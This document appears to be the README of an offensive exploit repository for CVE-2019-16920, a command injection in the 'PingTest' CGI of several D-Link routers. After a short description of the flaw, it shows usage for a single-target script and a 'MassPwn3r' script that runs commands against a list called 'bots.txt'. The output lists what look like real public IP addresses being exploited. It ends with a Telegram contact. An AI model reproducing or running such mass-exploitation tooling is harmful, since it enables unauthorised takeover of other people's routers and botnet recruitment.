# 0day exploit for Multiple D-Link Routers
Vulnerability was found in latest firmware of the following D-Link products:
    DIR-655
    DIR-866L
    DIR-652
    DHP-1565

# Current Description

Unauthenticated remote code execution occurs in D-Link products such as DIR-655C, DIR-866L, DIR-652, and DHP-1565. The issue occurs when the attacker sends an arbitrary input to a "PingTest" device common gateway interface that could lead to common injection. An attacker who successfully triggers the command injection could achieve full system compromise. Later, it was independently found that these are also affected: DIR-855L, DAP-1533, DIR-862L, DIR-615, DIR-835, and DIR-825.

# Usage CVE-2019-16920.py:
```
root@kali:~# python3 CVE-2019-16920.py 195.208.166.41 8081 ls
[*]Sending payload
[*]Exploited!
root@kali:~#
```

# Usage CVE-2019-16920-MassPwn3r.py:
```
root@kali:~# python3 CVE-2019-16920-MassPwn3r.py bots.txt 8081 id
[*]Exploiting:  195.208.166.41
[!]Unable to connect to host
[!]Unable to connect to host
[*]Exploiting:  83.243.166.37
[*]Exploiting:  74.95.133.33
[*]Exploiting:  97.89.64.118
[*]Exploiting:  66.162.68.154
[!]Unable to connect to host
[*]Exploiting:  72.47.152.161
[*]Exploiting:  97.93.250.209
[*]Exploiting:  183.207.196.64
root@kali:~#
```

# Contacts:
Telegram:```@eth_hacker0x18```
